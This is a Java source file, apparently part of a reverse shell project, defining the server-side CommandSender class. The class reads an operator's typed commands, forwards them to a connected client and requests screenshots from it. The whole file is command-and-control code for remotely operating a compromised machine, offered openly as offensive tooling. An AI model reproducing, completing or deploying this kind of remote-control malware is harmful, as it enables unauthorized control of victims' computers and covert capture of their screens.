package obs1d1anc1ph3r.reverseshell.server;

import java.io.*;

public class CommandSender {

    private PrintWriter out;
    private BufferedReader userInput;
    private ReverseShellServer server;

    public CommandSender(PrintWriter out, BufferedReader userInput, ReverseShellServer server) {
        this.out = out;
        this.userInput = userInput;
        this.server = server;
    }

    public void handleShell() {
        try {
            String command;
            System.out.print("\nCommand> ");
            while ((command = userInput.readLine()) != null) {
                if ("exit".equalsIgnoreCase(command)) {
                    sendCommand("exit");
                    break;
                }

                if (command.equalsIgnoreCase("screenshot")) {
                    server.receiveScreenshot();
                }

                sendCommand(command);
            }
        } catch (IOException e) {
            System.err.println("[ERROR] Error reading command input: " + e.getMessage());
        }
    }

    private void sendCommand(String command) {
        out.println(command);
    }
}
